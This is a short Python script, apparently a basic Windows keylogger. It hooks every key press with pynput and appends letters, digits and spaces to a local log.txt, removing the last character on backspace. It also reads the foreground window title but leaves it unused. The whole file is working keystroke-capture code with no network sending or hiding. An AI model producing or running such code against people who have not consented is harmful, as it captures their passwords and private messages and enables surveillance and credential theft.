from pynput.keyboard import Key, Listener
import win32gui

numeros = [str(i) for i in range(10)]
letras_min = [chr(i) for i in range(ord('a'), ord('z')+1)]
letras_mai = [chr(i) for i in range(ord('A'), ord('Z')+1)]
alf = []
alf_comp = numeros + letras_min + letras_mai
for i in alf_comp:
    i = i.replace("'", "")
    alf.append(i)

def on_press(key):
    hwnd = win32gui.GetForegroundWindow()
    win_title = win32gui.GetWindowText(hwnd)
    key = str(key)
    key = key.replace("'", "")
    print(key)
    if key in alf:
        with open('log.txt', 'a') as f:
            f.write(key)
    elif key == "Key.backspace":
        with open('log.txt', 'r+') as f:
            f.seek(0,2)
            f.seek(f.tell()-1,0)
            f.truncate()
    elif key == "Key.space":
        with open('log.txt', 'a') as f:
            f.write(" ")


with Listener(on_press=on_press) as listener:
    listener.join()
